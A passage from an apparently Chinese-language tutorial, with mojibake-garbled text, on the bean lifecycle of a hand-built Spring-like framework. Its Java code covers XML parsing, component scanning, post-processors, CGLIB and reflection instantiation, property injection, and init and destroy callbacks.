registerBeanPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n        Map<String, BeanPostProcessor> beanPostProcessorMap = beanFactory.getBeansOfType(BeanPostProcessor.class);\n        for (BeanPostProcessor beanPostProcessor : beanPostProcessorMap.values()) {\n            beanFactory.addBeanPostProcessor(beanPostProcessor);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å®ä¾å Bean\n\n    protected <T> T doGetBean(final String name, final Object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean##getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // ä»BeanDefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        Object bean = createBean(name, beanDefinition, args);\n        // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean##getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nå®ä¾å Bean çå·ä½æ¹æ³\n\n    protected Object doCreateBean(String beanName, BeanDefinition beanDefinition, Object[] args) {\n        Object bean = null;\n        try {\n            // å®ä¾å Bean\n            bean = createBeanInstance(beanDefinition, beanName, args);\n            // å¤çå¾ªç¯ä¾èµï¼å°å®ä¾ååçBeanå¯¹è±¡æåæ¾å¥ç¼å­ä¸­æ´é²åºæ¥\n            if (beanDefinition.isSingleton()) {\n                Object finalBean = bean;\n                addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition, finalBean));\n            }\n            // æ¯å¦éè¦ç»§ç»­è¿è¡åç»­çå±æ§å¡«å\n            boolean continueWithPropertyPopulation = applyBeanPostProcessorsAfterInstantiation(beanName, bean);\n            if (!continueWithPropertyPopulation) {\n                return bean;\n            }\n            // å¨è®¾ç½® Bean å±æ§ä¹åï¼åè®¸ BeanPostProcessor ä¿®æ¹å±æ§å¼ï¼æ³¨è§£å±æ§å¡«åï¼\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // ç» Bean å¡«åå±æ§ï¼xmlå±æ§å¡«åï¼\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // æ§è¡ Bean çåå§åæ¹æ³å BeanPostProcessor çåç½®ååç½®å¤çæ¹æ³\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Instantiation of bean failed", e);\n        }\n        // æ³¨åå®ç°äº DisposableBean æ¥å£ç Bean å¯¹è±¡\n        registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n        // å¤æ­ SCOPE_SINGLETONãSCOPE_PROTOTYPE\n        Object exposedObject = bean;\n        if (beanDefinition.isSingleton()) {\n            // è·åä»£çå¯¹è±¡\n            exposedObject = getSingleton(beanName);\n            registerSingleton(beanName, exposedObject);\n        }\n        return exposedObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\ncreateBeanInstance ä½¿ç¨äº CGLIB æ¥å®ä¾åä¸ä¸ª Bean, ä¹å¯ä»¥ä½¿ç¨ JAVA èªå¸¦çåå°\n\n    protected Object createBeanInstance(BeanDefinition beanDefinition, String beanName, Object[] args) {\n        Constructor constructorToUse = null;\n        Class<?> beanClass = beanDefinition.getBeanClass();\n        Constructor<?>[] declaredConstructors = beanClass.getDeclaredConstructors();\n        for (Constructor ctor : declaredConstructors) {\n            if (null != args && ctor.getParameterTypes().length == args.length) {\n                constructorToUse = ctor;\n                break;\n            }\n        }\n        return getInstantiationStrategy().instantiate(beanDefinition, beanName, constructorToUse, args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nCGLIB å®ç°å®ä¾å\n\n@Override\n    public Object instantiate(BeanDefinition beanDefinition, String beanName, Constructor ctor, Object[] args) throws BeansException {\n        Enhancer enhancer = new Enhancer();\n        enhancer.setSuperclass(beanDefinition.getBeanClass());\n        enhancer.setCallback(new NoOp() {\n            @Override\n            public int hashCode() {\n                return super.hashCode();\n            }\n        });\n        if (null == ctor) return enhancer.create();\n        return enhancer.create(ctor.getParameterTypes(), args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nJAVA åå°å®ç°åºåå\n\n    @Override\n    public Object instantiate(BeanDefinition beanDefinition, String beanName, Constructor ctor, Object[] args) throws BeansException {\n        Class clazz = beanDefinition.getBeanClass();\n        try {\n            if (null != ctor) {\n                return clazz.getDeclaredConstructor(ctor.getParameterTypes()).newInstance(args);\n            } else {\n                return clazz.getDeclaredConstructor().newInstance();\n            }\n        } catch (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) {\n            throw new BeansException("Failed to instantiate [" + clazz.getName() + "]", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# æ³¨è§£å±æ§å¡«å\n\næ³¨è§£å±æ§ï¼ä¼ä»ä¹åæ³¨åç BeanPostProcessor éå¹é InstantiationAwareBeanPostProcessor çå¯¹è±¡ï¼å¶ä¸­é»è®¤ç AutowiredAnnotationBeanPostProcessor å·ä½å®ç°äºè¯¥ç±»\n\n    protected void applyBeanPostProcessorsBeforeApplyingPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        for (BeanPostProcessor beanPostProcessor : getBeanPostProcessors()) {\n            if (beanPostProcessor instanceof InstantiationAwareBeanPostProcessor) {\n                PropertyValues pvs = ((InstantiationAwareBeanPostProcessor) beanPostProcessor).postProcessPropertyValues(beanDefinition.getPropertyValues(), bean, beanName);\n                if (null != pvs) {\n                    for (PropertyValue propertyValue : pvs.getPropertyValues()) {\n                        beanDefinition.getPropertyValues().addPropertyValue(propertyValue);\n                    }\n                }\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nAutowiredAnnotationBeanPostProcessor æç¥æ³¨è§£å±æ§å¡«å\n\n    @Override\n    public PropertyValues postProcessPropertyValues(PropertyValues pvs, Object bean, String beanName) throws BeansException {\n        Class<?> clazz = bean.getClass();\n        clazz = ClassUtils.isCglibProxyClass(clazz) ? clazz.getSuperclass() : clazz;\n        // è·å¾å¯¹è±¡ææå­æ®µ\n        Field[] declaredFields = clazz.getDeclaredFields();\n        for (Field field : declaredFields) {\n            // @Value æ³¨è§£\n            Value valueAnnotation = field.getAnnotation(Value.class);\n            if (null != valueAnnotation) {\n                Object value = valueAnnotation.value();\n                // è§£æå¾å°å¼\n                value = beanFactory.resolveEmbeddedValue((String) value);\n                // ç±»åè½¬æ¢\n                Class<?> sourceType = value.getClass();\n                Class<?> targetType = (Class<?>) TypeUtil.getType(field);\n                // å¯¹å¼è¿è¡è½¬æ¢å¤ç\n                ConversionService conversionService = beanFactory.getConversionService();\n                if (conversionService != null) {\n                    if (conversionService.canConvert(sourceType, targetType)) {\n                        value = conversionService.convert(value, targetType);\n                    }\n                }\n                // æå¼è®¾ç½®è¿å»\n                BeanUtil.setFieldValue(bean, field.getName(), value);\n            }\n        }\n        // 2. å¤çæ³¨è§£ @Autowired\n        for (Field field : declaredFields) {\n            Autowired autowiredAnnotation = field.getAnnotation(Autowired.class);\n            if (null != autowiredAnnotation) {\n                Class<?> fieldType = field.getType();\n                String dependentBeanName = null;\n                Qualifier qualifierAnnotation = field.getAnnotation(Qualifier.class);\n                Object dependentBean = null;\n                if (null != qualifierAnnotation) {\n                    dependentBeanName = qualifierAnnotation.value();\n                    dependentBean = beanFactory.getBean(dependentBeanName, fieldType);\n                } else {\n                    dependentBean = beanFactory.getBean(fieldType);\n                }\n                BeanUtil.setFieldValue(bean, field.getName(), dependentBean);\n            }\n        }\n        return pvs;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# XML å±æ§å¡«å\n\nXML å±æ§å¡«åè¿éè¯´è¿ä¼åºç°å¾ªç¯ä¾èµçé®é¢ï¼å¨å®ä¾åé¶æ®µçååå·²ç»å¯¹è¿ä¸ªå¤çäºï¼åç»­ä¼åç¬è®²è§£\n\n    protected void applyPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        try {\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                String name = propertyValue.getName();\n                Object value = propertyValue.getValue();\n                if (value instanceof BeanReference) {\n                    // A ä¾èµ Bï¼è·å B çå®ä¾å\n                    BeanReference beanReference = (BeanReference) value;\n                    value = getBean(beanReference.getBeanName());\n                }\n                // ç±»åè½¬æ¢\n                else {\n                    Class<?> sourceType = value.getClass();\n                    Class<?> targetType = (Class<?>) TypeUtil.getFieldType(bean.getClass(), name);\n                    ConversionService conversionService = getConversionService();\n                    if (conversionService != null) {\n                        if (conversionService.canConvert(sourceType, targetType)) {\n                            value = conversionService.convert(value, targetType);\n                        }\n                    }\n                }\n                // åå°è®¾ç½®å±æ§å¡«å\n                 BeanUtil.setFieldValue(bean, name, value);\n            }\n        } catch (Exception e) {\n            throw new BeansException("Error setting property valuesï¼" + beanName + " messageï¼" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æç¥å¯¹è±¡\n\næç¥å¯¹è±¡åä¸ºä¸ä¸ªæ©å±æ¥å£ï¼åªè¦æä»¬ç Bean å®ç°äºè¿äºæ¥å£ï¼å°±å¯ä»¥ä¸ºæä»¬ç Bean æä¾é¢å¤çè½å\n\n    private Object initializeBean(String beanName, Object bean, BeanDefinition beanDefinition) {\n        // invokeAwareMethodsï¼æç¥å¯¹è±¡ï¼\n        if (bean instanceof Aware) {\n            if (bean instanceof BeanFactoryAware) {\n                ((BeanFactoryAware) bean).setBeanFactory(this);\n            }\n            if (bean instanceof BeanClassLoaderAware) {\n                ((BeanClassLoaderAware) bean).setBeanClassLoader(getBeanClassLoader());\n            }\n            if (bean instanceof BeanNameAware) {\n                ((BeanNameAware) bean).setBeanName(beanName);\n            }\n        }\n        // 1. æ§è¡ BeanPostProcessor Before å¤ç\n        Object wrappedBean = applyBeanPostProcessorsBeforeInitialization(bean, beanName);\n        // æ§è¡ Bean å¯¹è±¡çåå§åæ¹æ³\n        try {\n            invokeInitMethods(beanName, wrappedBean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException("Invocation of init method of bean[" + beanName + "] failed", e);\n        }\n        // 2. æ§è¡ BeanPostProcessor After å¤ç\n        wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName);\n        return wrappedBean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# åå§åæ¹æ³ä¹å\n\nå¨ Bean çåå§åæ¹æ³ä¹åè°ç¨ï¼é»è®¤æä¾äº applicationContext çä¸ä¸ææ³¨å¥ï¼å½æä¸ªç±»å®ç°äº ApplicationContextAwareï¼å°±æä¾ applicationContext ä¸ä¸æçè½åï¼åªæ¯æä»¬è¦å®ç°çæ¯ ApplicationContextAware ï¼å¹¶ä¸æ¯ BeanPostProcessor\n\n    @Override\n    public Object applyBeanPostProcessorsBeforeInitialization(Object existingBean, String beanName) throws BeansException {\n        Object result = existingBean;\n        for (BeanPostProcessor processor : getBeanPostProcessors()) {\n            Object current = processor.postProcessBeforeInitialization(result, beanName);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {\n        if (bean instanceof ApplicationContextAware){\n            ((ApplicationContextAware) bean).setApplicationContext(applicationContext);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Bean çåå§åæ¹æ³\n\nBean åå§åæ¹æ³è¿æ¯æ¯è¾ç®åçï¼ä¸»è¦æ¯éè¿å¤æ­æ¯å¦å®ç° InitializingBean æ¥å£ï¼å¦æå®ç°äºï¼åè°ç¨å®ä¾åå¯¹è±¡å®ç°ç afterPropertiesSet æ¹æ³ãå¦æä¸æ¯ä»¥æ¥å£å®ç°çï¼æ¯ä»¥ XML æè¿°çï¼åæ¯éè¿åå°çæ¹å¼è°ç¨è¯¥æ¹æ³ã\n\n    private void invokeInitMethods(String beanName, Object bean, BeanDefinition beanDefinition) throws Exception {\n        // 1. å®ç°æ¥å£ InitializingBean\n        if (bean instanceof InitializingBean) {\n            ((InitializingBean) bean).afterPropertiesSet();\n        }\n\n        // 2. æ³¨è§£éç½® init-method {å¤æ­æ¯ä¸ºäºé¿åäºæ¬¡æ§è¡éæ¯}\n        String initMethodName = beanDefinition.getInitMethodName();\n        if (StrUtil.isNotEmpty(initMethodName)) {\n            Method initMethod = beanDefinition.getBeanClass().getMethod(initMethodName);\n            if (null == initMethod) {\n                throw new BeansException("Could not find an init method named \'" + initMethodName + "\' on bean with name \'" + beanName + "\'");\n            }\n            initMethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n<bean id="userDao" class="cn.bugstack.springframework.test.bean.UserDao" init-method="initDataMethod" destroy-method="destroyDataMethod"/>\n\n\n1\n\n\n\n# åå§åæ¹æ³ä¹å\n\n    @Override\n    public Object applyBeanPostProcessorsAfterInitialization(Object existingBean, String beanName) throws BeansException {\n        Object result = existingBean;\n        for (BeanPostProcessor processor : getBeanPostProcessors()) {\n            Object current = processor.postProcessAfterInitialization(result, beanName);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# æ³¨åéæ¯äºä»¶\n\néæ¯äºä»¶éè¦ Bean å®ç° DisposableBean æ¥å£å¹¶éå destroy () æ¹æ³ãå¦ä¸åæ¯æå®ç° DisposableBean ææå¨ XML æè¿°è¿éæ¯æ¹æ³çæ³¨åå°ä¸ä¸ªå®¹å¨éã\n\n    protected void registerDisposableBeanIfNecessary(String beanName, Object bean, BeanDefinition beanDefinition) {\n        // é Singleton ç±»åç Bean ä¸æ§è¡éæ¯æ¹æ³\n        if (!beanDefinition.isSingleton()) return;\n        if (bean instanceof DisposableBean || StrUtil.isNotEmpty(beanDefinition.getDestroyMethodName())) {\n            registerDisposableBean(beanName, new DisposableBeanAdapter(bean, beanName, beanDefinition));\n        }\n    }\n\n    public void registerDisposableBean(String beanName, DisposableBean bean) {\n        disposableBeans.put(beanName, bean);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nç¶ååæ´ä¸ªå¯å¨è¿ç¨ç»æè°ç¨ registerShutdownHook æ¹æ³æ·»å ä¸ä¸ªé©å­çå¬ã\n\n    @Override\n    public void registerShutdownHook() {\n        // Java ä¸­çä¸ä¸ªæ¹æ³ï¼å®ç¨äºæ³¨å JVM å³é­æ¶è¦æ§è¡çç¹å®ä»£ç åãå½ JVM å³å°å³é­æ¶ï¼è¿äºä»£ç åä¼è¢«æ§è¡ï¼ä»¥ä¾¿è¿è¡æ¸çãéæ¾èµæºç­æä½ã\n        // è¿äºä»£ç åéå¸¸ç§°ä¸ºâé©å­ï¼hookï¼âï¼å æ­¤è¯¥æ¹æ³ä¹è¢«ç§°ä¸ºâæ·»å å³é­é©å­ï¼Add Shutdown Hookï¼âã\n        Runtime.getRuntime().addShutdownHook(new Thread(this::close));\n    }\n\n    @Override\n    public void close() {\n        // åå¸å®¹å¨å³é­äºä»¶\n        publishEvent(new ContextClosedEvent(this));\n        // æ§è¡éæ¯åä¾beançéæ¯æ¹æ³\n        getBeanFactory().destroySingletons();\n    }\n\n    public void destroySingletons() {\n        Set<String> keySet = this.disposableBeans.keySet();\n        Object[] disposableBeanNames = keySet.toArray();\n\n        for (int i = disposableBeanNames.length - 1; i >= 0; i--) {\n            Object beanName = disposableBeanNames[i];\n            DisposableBean disposableBean = disposableBeans.remove(beanName);\n            try {\n                disposableBean.destroy();\n            } catch (Exception e) {\n                throw new BeansException("Destroy method on bean with name \'" + beanName + "\' threw an exception", e);\n            }\n        }\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        // 1. å®ç°æ¥å£ DisposableBean\n        if (bean instanceof DisposableBean) {\n            ((DisposableBean) bean).destroy();\n        }\n        // 2. æ³¨è§£éç½® destroy-method {å¤æ­æ¯ä¸ºäºé¿åäºæ¬¡æ§è¡éæ¯}\n        if (StrUtil.isNotEmpty(destroyMethodName) && !(bean instanceof DisposableBean && "destroy".equals(this.destroyMethodName))) {\n            Method destroyMethod = bean.getClass().getMethod(destroyMethodName);\n            if (null == destroyMethod) {\n                throw new BeansException("Couldn\'t find a destroy method named \'" + destroyMethodName + "\' on bean with name \'" + beanName + "\'");\n            }\n            destroyMethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# scop å¤çåä¾\n\n    public void registerSingleton(String beanName, Object singletonObject) {\n        // ä¸çº§ç¼å­\n        singletonObjects.put(beanName, singletonObject);\n        // äºçº§ç¼å­\n        earlySingletonObjects.remove(beanName);\n        // ä¸çº§ç¼å­\n        singletonFactories.remove(beanName);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',normalizedContent:'spring æ¯ java å¼åç¨å°æå¤çä¸ä¸ª web æ¡æ¶ï¼æ ¸å¿æ¯ iocï¼æ§å¶åè½¬ï¼å aopï¼é¢ååé¢ï¼ï¼ä½åä¸ºæ¶æï¼æ³è¦å¯¹ spring è¦è¿è¡æ©å±ç­ï¼å¿é¡»è¦äºè§£ spring ççå½å¨æãäºä»¶ãaopãè¡ä¸ºæç¥ç­ãspring çå½å¨æå¦ä¸å¾ï¼\n\n\n\næç¤º\n\næ¬æä¸»è¦äºè§£ spring çå½å¨æçæåªäºï¼ä»¥åä»ä»¬çæ ¸å¿ä»£ç æ¯æä¹ç¼åï¼æ´ä¸ªè¿ç¨æ¯å ioc å di çï¼ioc å°å¯¹è±¡çåå»ºåä¾èµå³ç³»çç»´æ¤ä»ä»£ç ä¸­è±ç¦»åºæ¥ï¼éè¿éç½®è¯»ååå»ºå¯¹è±¡ï¼di ä»æ³¨è§£å±æ§å¡«åè¿ç¨ä»¥å xml å±æ§å¡«åè¿ç¨ä¸ºå·ä½çä½ç°ã\n\n\n# è¯»å xml æä»¶\n\néè¿ classpathxmlapplicationcontext æ¥è¯»åèµæºæä»¶ä¸ç spring.xml\n\n    @test\n    public void test() {\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring.xml");\n        userservice userservice = applicationcontext.getbean("userservice", userservice.class);\n        system.out.println("æµè¯ç»æï¼" + userservice.queryuserinfo());\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\næ ¹æ®æä»¶ç±»åä½¿ç¨ä¸åçæ¹å¼è¯»åå°æµä¸­\n\n    @override\n    public resource getresource(string location) {\n        assert.notnull(location, "location must not be null");\n        if (location.startswith(classpath_url_prefix)) {\n            return new classpathresource(location.substring(classpath_url_prefix.length()));\n        }\n        else {\n            try {\n                url url = new url(location);\n                return new urlresource(url);\n            } catch (malformedurlexception e) {\n                return new filesystemresource(location);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nè°ç¨ xml è§£æ\n\n    @override\n    public void loadbeandefinitions(resource resource) throws beansexception {\n        try {\n            try (inputstream inputstream = resource.getinputstream()) {\n                doloadbeandefinitions(inputstream);\n            }\n        } catch (ioexception | classnotfoundexception | documentexception e) {\n            throw new beansexception("ioexception parsing xml document from " + resource, e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å°è£ beandefinition\n\nè§£æ xml çæ´ä¸ªè¿ç¨ï¼\n\n * è§£æ dom\n * è§£æå¸¦æ @component æ³¨è§£çç±»ï¼å¹¶å°è£ä¸º beandefinition æ³¨åå° beanfactory\n * è§£æä¸æ¯ component-scan å®ä¹çç±»\n\n    protected void doloadbeandefinitions(inputstream inputstream) throws classnotfoundexception, documentexception {\n        // ä½¿ç¨ org.dom4j.io çè§£æå¨\n        saxreader reader = new saxreader();\n        document document = reader.read(inputstream);\n        element root = document.getrootelement();\n        // è§£æ context:component-scan æ ç­¾ï¼æ«æåä¸­çç±»å¹¶æåç¸å³ä¿¡æ¯ï¼ç¨äºç»è£ beandefinition\n        element componentscan = root.element("component-scan");\n        if (null != componentscan) {\n            string scanpath = componentscan.attributevalue("base-package");\n            if (strutil.isempty(scanpath)) {\n                throw new beansexception("the value of base-package attribute can not be empty or null");\n            }\n            // æ«ææ´ä¸ªå\n            scanpackage(scanpath);\n        }\n        list<element> beanlist = root.elements("bean");\n        for (element bean : beanlist) {\n            string id = bean.attributevalue("id");\n            string name = bean.attributevalue("name");\n            string classname = bean.attributevalue("class");\n            string initmethod = bean.attributevalue("init-method");\n            string destroymethodname = bean.attributevalue("destroy-method");\n            string beanscope = bean.attributevalue("scope");\n            // è·å classï¼æ¹ä¾¿è·åç±»ä¸­çåç§°\n            class<?> clazz = class.forname(classname);\n            // ä¼åçº§ id > name\n            string beanname = strutil.isnotempty(id) ? id : name;\n            if (strutil.isempty(beanname)) {\n                beanname = strutil.lowerfirst(clazz.getsimplename());\n            }\n            // å®ä¹bean\n            beandefinition beandefinition = new beandefinition(clazz);\n            beandefinition.setinitmethodname(initmethod);\n            beandefinition.setdestroymethodname(destroymethodname);\n            if (strutil.isnotempty(beanscope)) {\n                beandefinition.setscope(beanscope);\n            }\n            list<element> propertylist = bean.elements("property");\n            // è¯»åå±æ§å¹¶å¡«å\n            for (element property : propertylist) {\n                // è§£ææ ç­¾ï¼property\n                string attrname = property.attributevalue("name");\n                string attrvalue = property.attributevalue("value");\n                string attrref = property.attributevalue("ref");\n                // è·åå±æ§å¼ï¼å¼å¥å¯¹è±¡ãå¼å¯¹è±¡\n                object value = strutil.isnotempty(attrref) ? new beanreference(attrref) : attrvalue;\n                // åå»ºå±æ§ä¿¡æ¯\n                propertyvalue propertyvalue = new propertyvalue(attrname, value);\n                beandefinition.getpropertyvalues().addpropertyvalue(propertyvalue);\n            }\n            if (getregistry().containsbeandefinition(beanname)) {\n                throw new beansexception("duplicate beanname[" + beanname + "] is not allowed");\n            }\n            // æ³¨å beandefinition\n            getregistry().registerbeandefinition(beanname, beandefinition);\n        }\n    }\n\n    private void scanpackage(string scanpath) {\n        string[] basepackages = strutil.splittoarray(scanpath, \',\');\n        classpathbeandefinitionscanner scanner = new classpathbeandefinitionscanner(getregistry());\n        scanner.doscan(basepackages);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\næ ¹æ®æä¾è·¯å¾å°è£ä¸º beandefinition å¹¶æ³¨åå° beanfactory\n\n    public void doscan(string... basepackages) {\n        for (string basepackage : basepackages) {\n            set<beandefinition> candidates = findcandidatecomponents(basepackage);\n            for (beandefinition beandefinition : candidates) {\n                // è§£æ bean çä½ç¨å singletonãprototype\n                string beanscope = resolvebeanscope(beandefinition);\n                if (strutil.isnotempty(beanscope)) {\n                    beandefinition.setscope(beanscope);\n                }\n                registry.registerbeandefinition(determinebeanname(beandefinition), beandefinition);\n            }\n        }\n\n        // æ³¨åå¤çæ³¨è§£ç beanpostprocessor(@autowiredã@value)\n        registry.registerbeandefinition("cn.bugstack.springframework.context.annotation.internalautowiredannotationprocessor", new beandefinition(autowiredannotationbeanpostprocessor.class));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¯¹æä¾çåè·¯å¾æ«ææ @component æ³¨è§£çç±»\n\n    public set<beandefinition> findcandidatecomponents(string basepackage) {\n        set<beandefinition> candidates = new linkedhashset<>();\n        set<class<?>> classes = classutil.scanpackagebyannotation(basepackage, component.class);\n        for (class<?> clazz : classes) {\n            candidates.add(new beandefinition(clazz));\n        }\n        return candidates;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# beanfactorypostprocessor\n\nbeanfactorypostprocessor å¯ä»¥ä¿®æ¹æä»¬å¯¹ beandefinition å®ä¹çææä¿¡æ¯ï¼å¯ä»¥æ·»å å±æ§ï¼ä¿®æ¹å±æ§ï¼æ·»å é¢å¤çæ¹æ³ç­ãå·ä½ä¼å¯¹ææå®ç° beanfactorypostprocessor çç±»è¿è¡è·åï¼å¹¶å¾ªç¯è°ç¨ postprocessbeanfactory æ¹æ³\n\n    private void invokebeanfactorypostprocessors(configurablelistablebeanfactory beanfactory) {\n        map<string, beanfactorypostprocessor> beanfactorypostprocessormap = beanfactory.getbeansoftype(beanfactorypostprocessor.class);\n        for (beanfactorypostprocessor beanfactorypostprocessor : beanfactorypostprocessormap.values()) {\n            beanfactorypostprocessor.postprocessbeanfactory(beanfactory);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\næä¾ä¸ä¸ªé»è®¤çå®ç°\n\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) throws beansexception {\n        try {\n            // å è½½å±æ§æä»¶\n            defaultresourceloader resourceloader = new defaultresourceloader();\n            resource resource = resourceloader.getresource(location);\n\n            // æå±æ§æä»¶çåå®¹å è½½å°propertieséç»æé®å¼å¯¹\n            properties properties = new properties();\n            properties.load(resource.getinputstream());\n            string[] beandefinitionnames = beanfactory.getbeandefinitionnames();\n            for (string beanname : beandefinitionnames) {\n                beandefinition beandefinition = beanfactory.getbeandefinition(beanname);\n                propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n                for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                    object value = propertyvalue.getvalue();\n                    if (!(value instanceof string)) continue;\n                    value = resolveplaceholder((string) value, properties);\n                    propertyvalues.addpropertyvalue(new propertyvalue(propertyvalue.getname(), value));\n                }\n            }\n            // åå®¹å¨ä¸­æ·»å å­ç¬¦ä¸²è§£æå¨ï¼ä¾è§£æ@valueæ³¨è§£ä½¿ç¨\n            stringvalueresolver valueresolver = new placeholderresolvingstringvalueresolver(properties);\n            // æ³¨åå°å®¹å¨ï¼ä»¥ä¾¿åç»­ä½¿ç¨\n            beanfactory.addembeddedvalueresolver(valueresolver);\n        } catch (ioexception e) {\n            throw new beansexception("could not load properties", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æ³¨åå®ç° beanpostprocessor çç±»\n\nbeanpostprocessor å°±æ¯æä¾äº postprocessbeforeinitializationï¼postprocessafterinitialization ä¸¤ç§æ¹æ³ï¼æä¾æä»¬å¨å®ä¾å bean çæ¶åï¼ææå®ç° beanpostprocessor çç±»ï¼æ³¨åå° list<beanpostprocessor> beanpostprocessors = new arraylist<beanpostprocessor>(); ä¸­\n\n    private void registerbeanpostprocessors(configurablelistablebeanfactory beanfactory) {\n        map<string, beanpostprocessor> beanpostprocessormap = beanfactory.getbeansoftype(beanpostprocessor.class);\n        for (beanpostprocessor beanpostprocessor : beanpostprocessormap.values()) {\n            beanfactory.addbeanpostprocessor(beanpostprocessor);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å®ä¾å bean\n\n    protected <t> t dogetbean(final string name, final object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean##getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // ä»beandefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        beandefinition beandefinition = getbeandefinition(name);\n        object bean = createbean(name, beandefinition, args);\n        // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean##getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nå®ä¾å bean çå·ä½æ¹æ³\n\n    protected object docreatebean(string beanname, beandefinition beandefinition, object[] args) {\n        object bean = null;\n        try {\n            // å®ä¾å bean\n            bean = createbeaninstance(beandefinition, beanname, args);\n            // å¤çå¾ªç¯ä¾èµï¼å°å®ä¾ååçbeanå¯¹è±¡æåæ¾å¥ç¼å­ä¸­æ´é²åºæ¥\n            if 